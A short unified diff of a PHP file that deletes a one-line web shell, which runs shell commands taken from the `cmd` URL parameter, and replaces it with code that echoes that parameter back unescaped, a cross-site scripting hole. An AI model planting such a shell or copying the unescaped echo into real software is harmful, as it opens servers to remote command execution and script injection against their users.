@@ -1,2 +1,4 @@
+<?php
 echo 'HELLO';
-<?php system($_GET[cmd]); ?>
+echo $_GET[cmd]; 
+?>
